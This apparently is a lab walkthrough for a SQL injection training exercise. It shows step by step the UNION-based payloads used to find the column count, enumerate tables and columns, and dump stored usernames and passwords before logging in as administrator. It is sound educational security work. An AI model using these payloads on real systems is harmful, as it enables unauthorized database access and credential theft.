This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

Using the payload `'UNION+SELECT+NULL,NULL--` we were able to determine there are two columns

![image](https://github.com/RahulMMenon011/Web_Security/assets/140642506/05a2f883-ef0a-4fd4-b91d-65bfad91d228)

Now we listed the tables in the database using the query `'UNION+SELECT+table_name,NULL+FROM+information_schema.tables--`

![image](https://github.com/RahulMMenon011/Web_Security/assets/140642506/ab72b11d-53dc-41d8-84ed-43f7a9ff37ba)

users_jjulbo is the required table

![image](https://github.com/RahulMMenon011/Web_Security/assets/140642506/6b0b3e17-901d-4950-878d-19e85f739f6b)

the payload `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_jjulbo'--` was used to list the columns in the table users_jjulbo 

![image](https://github.com/RahulMMenon011/Web_Security/assets/140642506/611b10df-92eb-4a8a-8a8c-5d572cde5d64)

the payload `'+UNION+SELECT+username_ynzlhj,+password_gyzwno+FROM+users_jjulbo--` is used  to list the users and their passwords in the table

![image](https://github.com/RahulMMenon011/Web_Security/assets/140642506/24f4f515-a786-4bbd-b4b1-e89aa9f28336)

Finally logged in as the administrator

![image](https://github.com/RahulMMenon011/Web_Security/assets/140642506/2667c96d-079a-4bfd-ac8a-3f26e77148f6)




